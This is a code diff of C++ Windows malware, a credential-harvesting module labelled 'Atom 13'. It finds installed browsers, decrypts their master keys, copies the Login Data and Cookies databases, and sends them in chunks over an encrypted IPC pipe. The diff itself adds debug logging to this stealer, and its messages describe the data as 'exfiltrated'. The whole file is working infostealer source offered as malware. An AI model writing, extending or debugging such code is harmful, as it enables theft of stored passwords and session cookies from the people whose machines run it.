@@ -219,7 +219,12 @@ DWORD WINAPI CredentialHarvesterAtomMain(LPVOID lpParam) {
     if (!hCmdPipe) { CredDebug("[Atom 13] FATAL: Command pipe failed."); return 1; }
 
     HANDLE hReportPipe = IPC_ConnectToReportPipe(dwAtomId);
-    if (!hReportPipe) { CloseHandle(hCmdPipe); return 1; }
+    if (!hReportPipe) { 
+        CredDebug("[Atom 13] FATAL: Report pipe failed. Error: %lu", GetLastError());
+        CloseHandle(hCmdPipe); 
+        return 1; 
+    }
+    CredDebug("[Atom 13] IPC pipes connected successfully.");
 
     BYTE SharedSessionKey[16];
     memcpy(SharedSessionKey, Config::PSK_ID, 16);
@@ -246,15 +251,18 @@ DWORD WINAPI CredentialHarvesterAtomMain(LPVOID lpParam) {
                     for (auto &browser : profiles) {
                         // Check if this browser exists
                         if (GetFileAttributesA(browser.localStatePath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+                            CredDebug("[Atom 13] Browser %s not installed (Path: %s)", browser.name.c_str(), browser.localStatePath.c_str());
                             fullReport += "[CREDS] " + browser.name + ": Not installed.\n";
                             continue;
                         }
 
+                        CredDebug("[Atom 13] Browser %s FOUND!", browser.name.c_str());
                         fullReport += "[CREDS] " + browser.name + ": FOUND!\n";
 
                         // Extract master key
                         std::vector<BYTE> masterKey;
                         if (ExtractMasterKey(browser.localStatePath.c_str(), masterKey)) {
+                            CredDebug("[Atom 13]   Master key decrypted for %s (%zu bytes).", browser.name.c_str(), masterKey.size());
                             fullReport += "[CREDS]   Master key decrypted (" + std::to_string(masterKey.size()) + " bytes).\n";
 
                             // Copy Login Data to temp for reading (browser locks it)
@@ -300,6 +308,7 @@ DWORD WINAPI CredentialHarvesterAtomMain(LPVOID lpParam) {
                                         offset += chunkSize;
                                     }
 
+                                    CredDebug("[Atom 13]   Login Data exfiltrated for %s (%zu bytes).", browser.name.c_str(), loginDb.size());
                                     fullReport += "[CREDS]   Login Data sent (" + std::to_string(loginDb.size()) + " bytes).\n";
                                 }
                                 DeleteFileA(szTempLogin);
@@ -340,10 +349,12 @@ DWORD WINAPI CredentialHarvesterAtomMain(LPVOID lpParam) {
                                         IPC_SendMessage(hReportPipe, &ckMsg, SharedSessionKey, 16);
                                         offset += chunkSize;
                                     }
+                                    CredDebug("[Atom 13]   Cookies exfiltrated for %s (%zu bytes).", browser.name.c_str(), cookiesDb.size());
                                 }
                                 DeleteFileA(szTempCookies);
                             }
                         } else {
+                            CredDebug("[Atom 13]   Master key extraction FAILED for %s.", browser.name.c_str());
                             fullReport += "[CREDS]   Master key extraction FAILED.\n";
                         }
                     }
